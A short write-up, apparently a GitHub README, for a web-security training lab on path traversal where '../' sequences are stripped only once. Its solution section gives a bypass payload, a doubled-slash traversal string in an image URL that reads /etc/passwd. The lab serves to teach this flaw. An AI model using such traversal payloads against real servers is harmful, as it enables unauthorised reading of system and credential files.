# Lab3: File Path Traversal - Traversal Sequences Stripped (Non-Recursive)

## 📝 Description

This lab demonstrates a File Path Traversal flaw where ../ sequences are stripped only once.

By inserting traversal patterns multiple times, you can bypass the filter and reach sensitive files.

## 🎯 Objective

- Learn how non-recursive sanitization works.

- Chain multiple traversal sequences to escape restricted directories.

- Access sensitive files like /etc/passwd.

## Solution

<img width="1366" height="433" alt="Screenshot (796)" src="https://github.com/user-attachments/assets/c4a838dc-788b-45f4-bb30-448b2ecad849" />

```
<img src="/image/filename=..//..//..//etc//passwd">
```
